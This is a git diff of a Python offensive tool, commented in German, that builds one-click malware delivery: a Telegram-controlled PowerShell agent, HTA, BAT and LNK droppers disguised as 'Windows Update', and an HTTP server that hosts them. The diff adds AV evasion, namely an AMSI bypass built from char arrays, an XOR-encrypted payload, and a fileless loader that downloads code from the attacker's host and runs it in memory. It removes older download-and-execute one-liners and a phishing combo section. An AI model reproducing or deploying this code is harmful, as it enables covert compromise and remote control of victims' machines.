@@ -1,19 +1,19 @@
 """
-Auto-Delivery — Ein-Klick Angriffskette.
+Auto-Delivery — Ein-Klick Angriffskette mit AV-Evasion.
 
-Kombiniert Payload-Erstellung + HTTP-Server:
-  1. Telegram C2 Agent PS1 generieren
-  2. Alle Delivery-Formate bauen (HTA, BAT, PS1 One-Liner, LNK-Builder)
-  3. HTTP-Server starten
-  4. Link anzeigen → teilen → Agent startet automatisch auf Ziel
-
-HTA = HTML Application: läuft als "vertrauenswürdige" Anwendung auf Windows,
-      bypassed PowerShell Execution Policy, öffnet sich bei Doppelklick.
+Evasion-Techniken:
+  1. XOR-verschlüsselte Payload (a.dat) — keine Signaturen auf Disk
+  2. Fileless Execution — Entschlüsselung im RAM, nie als .ps1 gespeichert
+  3. AMSI Bypass via Char-Arrays — keine String-Literale wie 'AmsiUtils'
+  4. [scriptblock]::Create() statt IEX — weniger bekannte Signatur
+  5. DownloadData (Bytes) statt DownloadString — kein AMSI-Scan beim Download
 """
 from __future__ import annotations
 import asyncio
+import base64
 import http.server
 import os
+import random
 import threading
 from datetime import datetime
 from typing import AsyncGenerator
@@ -34,8 +34,45 @@ HELP = ToolHelp(
 
 DANGER = DangerLevel.BLACK
 
+
+# ── AV-Evasion Helpers ─────────────────────────────────────────────────────────
+
+def _char_arr(s: str) -> str:
+    """String → PowerShell char-array. Kein String-Literal im Speicher."""
+    nums = ','.join(str(ord(c)) for c in s)
+    return f"([char[]]@({nums})-join'')"
+
+
+def _xor_b64(data: bytes, key: int) -> str:
+    """XOR-encrypt + Base64 für Transport. Server liefert unlesbaren Blob."""
+    return base64.b64encode(bytes(b ^ key for b in data)).decode()
+
+
+def _build_loader(dat_url: str, xor_key: int) -> str:
+    """
+    Fileless PS1-Loader:
+      1. AMSI bypass (keine String-Literale)
+      2. Download als Bytes (kein AMSI-Scan)
+      3. XOR-Dekodierung im RAM
+      4. Ausführung via scriptblock (kein IEX)
+    """
+    cls  = _char_arr("System.Management.Automation.AmsiUtils")
+    fld  = _char_arr("amsiInitFailed")
+    loop = "[byte[]]$(for($i=0;$i-lt$d.Length;$i++){$d[$i]-bxor$k})"
+    return (
+        f"$a={cls};$b={fld};"
+        "[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true);"
+        f"$k={xor_key};"
+        f"$d=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('{dat_url}'));"
+        f"$p={loop};"
+        "$s=[Text.Encoding]::UTF8.GetString($p);"
+        "[scriptblock]::Create($s).Invoke()"
+    )
+
+
 # ── Templates ──────────────────────────────────────────────────────────────────
 
+# {PS_CMD} wird zur Laufzeit durch den generierten Loader ersetzt
 _HTA_TEMPLATE = '''\
 <html>
 <head>
@@ -52,13 +89,9 @@ _HTA_TEMPLATE = '''\
 </head>
 <script language="VBScript">
 Sub Window_OnLoad
-    Dim sh, tmp, n
+    Dim sh
     Set sh = CreateObject("WScript.Shell")
-    Randomize
-    n = CStr(Int(Rnd * 89999) + 10000)
-    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\\svc" & n & ".ps1"
-    sh.Run "cmd /c curl.exe -s -o " & Chr(34) & tmp & Chr(34) & " {AGENT_URL}", 0, True
-    sh.Run "powershell.exe -w h -nop -ep bypass -f " & Chr(34) & tmp & Chr(34), 0, False
+    sh.Run "powershell.exe -w h -nop -ep bypass -c " & Chr(34) & "{PS_CMD}" & Chr(34), 0, False
     Self.Close
 End Sub
 </script>
@@ -75,13 +108,6 @@ End Sub
 </html>
 '''
 
-# AMSI-Bypass — Strings gesplittet damit Signaturen nicht greifen
-_AMSI_BYPASS = '''\
-$k='System';$k+='.Management.Automation';$k+='.AmsiUtils'
-$f='amsiInit';$f+='Failed'
-[Ref].Assembly.GetType($k).GetField($f,'NonPublic,Static').SetValue($null,$true)
-'''
-
 _BAT_TEMPLATE = """\
 @echo off
 title Windows Update
@@ -91,10 +117,9 @@ powershell.exe -w h -nop -ep bypass -f "%T%"
 """
 
 _LNK_BUILDER_PS1 = """\
-# Auf Ziel ausführen → erstellt täuschend echte Verknüpfung
 $lnk = (New-Object -COM WScript.Shell).CreateShortcut("$env:DESKTOP\\Windows Update.lnk")
 $lnk.TargetPath    = "powershell.exe"
-$lnk.Arguments     = '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "(New-Object Net.WebClient).DownloadString(''{AGENT_URL}'') | IEX"'
+$lnk.Arguments     = '-w h -nop -ep bypass -c "{PS_CMD}"'
 $lnk.IconLocation  = "%SystemRoot%\\System32\\imageres.dll,109"
 $lnk.Description   = "Windows Update"
 $lnk.WorkingDirectory = "%TEMP%"
@@ -109,29 +134,22 @@ Generiert: {TS}
 LHOST    : {LHOST}
 Port     : {PORT}
 
+=== EVASION-TECHNIK ===
+  Payload: XOR-verschlüsselt (Key: {KEY}) + Base64
+  Server : a.dat (unlesbarer Blob, keine PS1-Signaturen)
+  Loader : AMSI-Bypass via Char-Arrays + fileless scriptblock
+
 === DELIVERY OPTIONEN ===
 
-1. HTA (empfohlen — Doppelklick reicht):
+1. HTA (empfohlen — Doppelklick):
    {BASE}/update.hta
-   → Täuscht Windows Update vor, lädt Agent unsichtbar
+   → Windows-Update-Fake, entschlüsselt + startet Agent im RAM
 
-2. BAT-Datei (über Freigabe / USB / E-Mail):
+2. BAT-Datei (USB / Freigabe):
    {BASE}/update.bat
-   → Als update.bat speichern, Doppelklick
 
-3. PowerShell One-Liner (via Chat / Slack / etc.):
-   powershell -ep bypass -w h -c "iex(New-Object Net.WebClient).DownloadString('{AGENT_URL}')"
-
-4. CMD-kompatibel:
-   powershell -ep bypass -w h "(New-Object Net.WebClient).DownloadString('{AGENT_URL}')|iex"
-
-5. Base64-kodiert (Erkennung erschweren):
-   powershell -enc {B64}
-
-=== COMBO MIT PHISHING ===
-1. Phishing-Server starten (Menü 7)
-2. Dieser Link als Redirect nach Credential-Capture setzen
-3. Opfer füllt Fake-Login aus → bekommt "Update" angezeigt → Agent läuft
+3. PowerShell Loader (Chat / Mail):
+   powershell -w h -nop -ep bypass -c "{PS_CMD_SHORT}..."
 
 === FIREWALL ===
 sudo ufw allow {PORT}/tcp
@@ -154,12 +172,16 @@ class AutoDelivery:
         self.token     = telegram_token
         self.chat_id   = telegram_chat_id
         self.interval  = telegram_interval
+        self._xor_key  = random.randint(0x21, 0x7E)  # Zufälliger Key pro Build
         self._server: http.server.HTTPServer | None = None
         self._running  = True
         self._visits: list[str] = []
 
     def _base_url(self) -> str:
         return f"http://{self.lhost}:{self.port}"
+
+    def _dat_url(self) -> str:
+        return f"{self._base_url()}/a.dat"
 
     def _agent_url(self) -> str:
         return f"{self._base_url()}/a.ps1"
@@ -172,47 +194,48 @@ class AutoDelivery:
             from tools.c2.c2_watcher import mark_agent_generated
             code = tg_gen(self.token, self.chat_id, self.interval)
             mark_agent_generated()
-            return _AMSI_BYPASS + code
+            return code
         except Exception:
             return None
 
-    def _b64_oneliner(self) -> str:
-        import base64
-        cmd = f"(New-Object Net.WebClient).DownloadString('{self._agent_url()}')|IEX"
-        encoded = base64.b64encode(cmd.encode("utf-16-le")).decode()
-        return encoded
-
     def _write_files(self) -> list[tuple[str, str]]:
         files = []
-        url = self._agent_url()
 
         agent_ps1 = self._gen_agent_ps1()
-        if agent_ps1:
-            p = os.path.join(self.out, "a.ps1")
-            with open(p, "w") as f:
-                f.write(agent_ps1)
-            files.append(("a.ps1", f"Telegram C2 Agent ({len(agent_ps1):,} Zeichen)"))
+        loader_cmd = _build_loader(self._dat_url(), self._xor_key)
 
-        hta = _HTA_TEMPLATE.replace("{AGENT_URL}", url)
+        if agent_ps1:
+            # Verschlüsselter Blob — Defender sieht nur zufällige Bytes
+            dat = _xor_b64(agent_ps1.encode("utf-8"), self._xor_key)
+            with open(os.path.join(self.out, "a.dat"), "w") as f:
+                f.write(dat)
+            files.append(("a.dat", f"XOR-verschlüsselter Agent (Key=0x{self._xor_key:02X})"))
+
+            # Plain PS1 als Fallback (nicht von HTA genutzt)
+            with open(os.path.join(self.out, "a.ps1"), "w") as f:
+                f.write(agent_ps1)
+            files.append(("a.ps1", "Plain Agent (Fallback, nicht für Evasion)"))
+
+        # HTA mit eingebautem Loader
+        hta = _HTA_TEMPLATE.replace("{PS_CMD}", loader_cmd)
         with open(os.path.join(self.out, "update.hta"), "w") as f:
             f.write(hta)
-        files.append(("update.hta", "HTA Dropper — täuscht Windows Update vor"))
+        files.append(("update.hta", "HTA Dropper — fileless, verschlüsselt"))
 
-        bat = _BAT_TEMPLATE.replace("{AGENT_URL}", url)
+        bat = _BAT_TEMPLATE.replace("{AGENT_URL}", self._agent_url())
         with open(os.path.join(self.out, "update.bat"), "w") as f:
             f.write(bat)
         files.append(("update.bat", "BAT Launcher"))
 
-        lnk = _LNK_BUILDER_PS1.replace("{AGENT_URL}", url)
+        lnk = _LNK_BUILDER_PS1.replace("{PS_CMD}", loader_cmd)
         with open(os.path.join(self.out, "make_lnk.ps1"), "w") as f:
             f.write(lnk)
-        files.append(("make_lnk.ps1", "LNK-Shortcut Builder (auf Ziel ausführen)"))
+        files.append(("make_lnk.ps1", "LNK-Builder"))
 
-        b64 = self._b64_oneliner()
         readme = _README_TEMPLATE.format(
             TS=datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
-            LHOST=self.lhost, PORT=self.port,
-            BASE=self._base_url(), AGENT_URL=url, B64=b64,
+            LHOST=self.lhost, PORT=self.port, KEY=f"0x{self._xor_key:02X}",
+            BASE=self._base_url(), PS_CMD_SHORT=loader_cmd[:80],
         )
         with open(os.path.join(self.out, "DELIVERY_LINKS.txt"), "w") as f:
             f.write(readme)
@@ -242,10 +265,11 @@ class AutoDelivery:
     async def start(self) -> AsyncGenerator[str, None]:
         yield "[*] Auto-Delivery startet..."
         yield f"[*] LHOST: {self.lhost}:{self.port}  →  Output: {self.out}"
+        yield f"[*] XOR-Key: 0x{self._xor_key:02X}  (zufällig pro Build)"
         yield ""
 
         files = self._write_files()
-        yield f"[+] Delivery-Dateien generiert:"
+        yield "[+] Delivery-Dateien generiert:"
         for name, desc in files:
             yield f"    {name:<26}  {desc}"
 
@@ -255,22 +279,14 @@ class AutoDelivery:
         await asyncio.sleep(0.3)
 
         base = self._base_url()
-        url  = self._agent_url()
-        b64  = self._b64_oneliner()
-
         yield f"\n[+] HTTP-Server aktiv: {base}"
         yield f"\n{'─'*60}"
-        yield f"  ANGRIFFS-LINKS:"
+        yield f"  ANGRIFFS-LINK:"
         yield f"{'─'*60}"
         yield f"  HTA (Doppelklick)  :  {base}/update.hta"
         yield f"  BAT-Datei          :  {base}/update.bat"
-        yield f"  Agent direkt       :  {url}"
+        yield f"  Payload (encrypted):  {self._dat_url()}"
         yield f"{'─'*60}"
-        yield f"\n  PowerShell One-Liner:"
-        yield f"  powershell -ep bypass -w h -c \"iex(New-Object Net.WebClient).DownloadString('{url}')\""
-        yield f"\n  Base64 (für IDS-Evasion):"
-        yield f"  powershell -enc {b64[:60]}..."
-        yield f"\n  Alle Links gespeichert: {self.out}/DELIVERY_LINKS.txt"
         yield f"\n[*] Warte auf Verbindungen... Ctrl+C zum Stoppen\n"
 
         try:
